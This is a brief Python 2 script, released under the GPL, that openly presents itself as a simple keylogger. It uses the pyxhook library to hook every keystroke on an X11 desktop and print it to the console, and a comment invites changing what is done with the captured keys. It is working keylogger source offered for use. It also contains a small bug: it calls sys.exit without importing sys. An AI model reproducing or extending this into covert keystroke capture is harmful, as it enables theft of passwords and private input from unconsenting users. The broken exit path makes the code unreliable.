#!/usr/bin/python
#	A simple keylogger made using the help of pyxhook.
#	All credits of the pyxhook library goes to Tim Alexander <dragonfyre13@gmail.com>.
#	This is merely an implementation of the library. 
#
#	This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 2 of the License, or
#   (at your option) any later version.
#
#	


import pyxhook
import time

#This function is called every time a key is presssed
def kbevent( event ):
    # printing the key info, this needs to be modified as to what needs to be done 
    # with the key event information
    print event
    
#Create hookmanager
hookman = pyxhook.HookManager()
#Define our callback to fire when a key is pressed down
hookman.KeyDown = kbevent
#Hook the keyboard
hookman.HookKeyboard()
#Start our listener
hookman.start()
    
#Create a loop to keep the application running
running = True
while running:
	try:
		time.sleep(0.1)
	except KeyboardInterrupt:
		print "\nExiting.."
		#Close the listener when we are done
		hookman.cancel()
		sys.exit()

#Close the listener when we are done
#hookman.cancel()
